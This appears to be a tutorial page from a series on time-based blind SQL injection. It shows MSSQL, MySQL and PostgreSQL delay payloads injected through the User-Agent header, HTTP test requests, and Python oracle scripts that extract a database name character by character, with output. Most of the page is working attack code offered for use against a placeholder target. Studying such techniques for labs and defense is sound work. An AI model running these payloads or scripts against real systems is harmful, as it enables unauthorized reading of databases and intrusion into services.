# 🔮 Time-based Oracle Design

## Theory

No results or error messages displayed - only timing differences.

### How It Works

Make server wait different amounts of time based on query outcome:

```sql
SELECT ... FROM ... WHERE ... = 'Mozilla...'; IF (q) WAITFOR DELAY '0:0:5'--'
```

| Query Result | Server Behavior |
|--------------|-----------------|
| `q` = True | Wait 5 seconds, then respond |
| `q` = False | Respond immediately |

---

## Testing the Oracle

### False Query (1=0)

```http
GET / HTTP/1.1
Host: <TARGET>
User-Agent: ';IF(1=0) WAITFOR DELAY '0:0:5'--
```

**Response time**: ~9ms (immediate) ✅

### True Query (1=1)

```http
GET / HTTP/1.1
Host: <TARGET>
User-Agent: ';IF(1=1) WAITFOR DELAY '0:0:5'--
```

**Response time**: ~5,071ms (delayed) ✅

---

## Python Oracle Script

```python
#!/usr/bin/env python3
import requests
import time

# Delay in seconds - adjust based on network speed
DELAY = 1

def oracle(q):
    """
    Returns True if query q evaluates to true (causes delay)
    Returns False if query q evaluates to false (no delay)
    """
    start = time.time()
    r = requests.get(
        "http://<TARGET>:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    elapsed = time.time() - start
    return elapsed > DELAY

# Sanity check - verify oracle works
assert oracle("1=1")        # Should be True (delayed)
assert not oracle("1=0")    # Should be False (immediate)

print("[+] Oracle working correctly!")
```

---

## Choosing Delay Value

### Trade-offs

| Delay | Pros | Cons |
|-------|------|------|
| **1 second** | Fast extraction | False positives from slow network |
| **3 seconds** | Good balance | Moderate extraction time |
| **5 seconds** | Very accurate | Slow extraction |
| **10 seconds** | Extremely accurate | Very slow |

### Recommendation

```python
# Start with longer delay for accuracy
DELAY = 5

# Once confident, reduce for speed
DELAY = 2
```

### Network Considerations

- **Slow VPN**: Use higher delay (5-10s)
- **Fast local**: Can use lower delay (1-2s)
- **Unstable connection**: Use higher delay + multiple retries

---

## Example: Extract Database Name

### Query Base

```sql
(SELECT SUBSTRING(DB_NAME(), 5, 1)) = 'a'
```

### Extraction Script

```python
#!/usr/bin/env python3
import requests
import time

DELAY = 5

def oracle(q):
    start = time.time()
    response = requests.get(
        "http://<TARGET>:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    return time.time() - start >= DELAY

# Find 5th character of DB_NAME()
# Range 97-123 = lowercase letters (a-z)
for i in range(97, 123):
    if oracle(f"(SELECT SUBSTRING(DB_NAME(), 5, 1)) = '{chr(i)}'"):
        print(f"The fifth letter of DB_NAME() is '{chr(i)}'")
        break
```

### Output

```bash
$ python3 oracle.py
The fifth letter of DB_NAME() is 'r'
```

---

## Time Oracle vs Boolean Oracle

| Aspect | Boolean Oracle | Time Oracle |
|--------|----------------|-------------|
| **Detection** | Response content/length | Response time |
| **Speed** | Faster | Slower |
| **Accuracy** | More reliable | Network dependent |
| **Visibility** | Needs visible difference | Works blindly |

---

## Common Patterns

### Conditional Delay

```sql
-- MSSQL
IF (condition) WAITFOR DELAY '0:0:5'

-- MySQL
IF(condition, SLEEP(5), 0)

-- PostgreSQL
SELECT CASE WHEN condition THEN pg_sleep(5) END
```

### Payload Templates

```python
# MSSQL - String context
f"';IF({query}) WAITFOR DELAY '0:0:{DELAY}'--"

# MSSQL - Numeric context
f"1;IF({query}) WAITFOR DELAY '0:0:{DELAY}'--"

# MySQL - String context
f"' AND IF({query}, SLEEP({DELAY}), 0)-- -"
```

---

## Improving Reliability

### Multiple Checks

```python
def oracle(q, attempts=3):
    """More reliable oracle with multiple attempts"""
    successes = 0
    for _ in range(attempts):
        start = time.time()
        requests.get(url, headers={"User-Agent": payload.format(q=q)})
        if time.time() - start >= DELAY:
            successes += 1
    # Majority vote
    return successes > attempts // 2
```

### Threshold Buffer

```python
def oracle(q):
    start = time.time()
    requests.get(url, headers={"User-Agent": payload})
    elapsed = time.time() - start
    # Use 80% of DELAY as threshold to account for network variance
    return elapsed > (DELAY * 0.8)
```

---

## Quick Reference

### Oracle Template

```python
def oracle(q):
    start = time.time()
    requests.get(url, headers={...})
    return time.time() - start > DELAY
```

### Verification

```python
assert oracle("1=1"), "Should delay on true"
assert not oracle("1=0"), "Should not delay on false"
```

### ASCII Ranges

| Range | Characters |
|-------|------------|
| 48-57 | 0-9 (digits) |
| 65-90 | A-Z (uppercase) |
| 97-122 | a-z (lowercase) |
| 32-126 | All printable |

---

## Next Steps

- [Time-based Data Extraction](extracting-data-time.md)
- [Optimizing Time-based Attacks](optimizing-time.md)

